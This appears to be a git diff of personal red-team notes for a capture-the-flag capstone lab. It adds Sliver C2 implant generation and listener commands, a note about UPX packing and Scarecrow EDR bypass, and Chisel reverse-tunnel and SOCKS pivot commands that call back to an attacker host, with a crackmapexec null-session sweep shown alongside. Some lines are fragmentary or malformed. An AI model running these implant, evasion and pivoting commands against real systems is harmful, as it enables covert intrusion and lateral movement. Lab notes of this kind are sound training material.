@@ -55,11 +55,43 @@ crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
 
 Silver and EDR bypassing Scarecrow
 ```go
+// 
+// remember to upx
 // For VPN
-sliver > generate --mtls 10.50.114.111:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/VPN-upgrade
-mtls -L 10.50.114.111 -l 11011
-
+generate --mtls 10.50.110.109:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.110.109:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+mtls -L 10.50.110.109 -l 11011
+mtls -L 10.50.110.109 -l 11012
 ```
+
+Chisel Organisation
+```go
+// remove glibc version issues be remove dependencies!
+export CGO_ENABLED=0
+go build -ldflags="-s -w"
+// Edit proxychains file
+sudo vim /etc/proxychains4.conf
+// VPN chisel server
+./chisel server -p 20000 -reverse -v
+
+
+// VPN chisel Client - local pivot
+nohup ./chisel client 10.50.110.109:20000 20001:127.0.0.1:20000 &
+// 01-09 for individual VPN client pivots, socks, fowards
+nohup ./chisel client 10.50.110.109:20000 R:127.0.01:20002:socks &
+
+
+// 11-19 for individual * client pivots 
+
+nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &
+
+// reverse port forward syntax for the granular needs
+nohup ./chisel client 10.50.110.109:20000 R:127.0.0.1:6379:172.19.0.2:6379 &
+
+// reverse port forward syntax for the granular needs
+nohup ./chisel client 10.50.110.109:20000 R:127.0.0.1: &
+```
+
 
 New
 ```bash
